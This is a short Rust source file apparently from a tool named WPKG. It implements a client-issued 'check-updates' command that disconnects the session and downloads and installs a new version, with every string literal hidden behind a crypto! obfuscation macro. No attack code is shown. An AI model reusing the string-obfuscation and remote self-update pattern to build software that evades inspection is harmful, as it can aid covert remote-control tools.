use super::prelude::*;
use crate::{error_crypt, updater};

pub struct CheckUpdates;

#[async_trait]
impl Command for CheckUpdates {
    fn name(&self) -> String {
        crypto!("check-updates")
    }

    fn help(&self) -> String {
        crypto!("Checking updates")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        match updater::check_updates().await {
            Ok((up_to_date, new_version, url)) => {
                if !up_to_date {
                    client.send(format!(
                        "{} {}",
                        crypto!("Disconnecting & starting update... because found a new version"),
                        new_version
                    ))?;

                    client.send("/disconnect")?;

                    if let Err(err) = updater::update(&url).await {
                        error!("{}: {err}", crypto!("Updating failed"));
                    }
                } else {
                    client.send(&crypto!("WPKG is up to date!"))?;
                }
            },

            Err(e) => {
                let msg = format!("{} {}", crypto!("Failed to check updates"), e);

                error_crypt!("{msg}");

                client.send(msg)?;
            },
        }
        Ok(())
    }
}
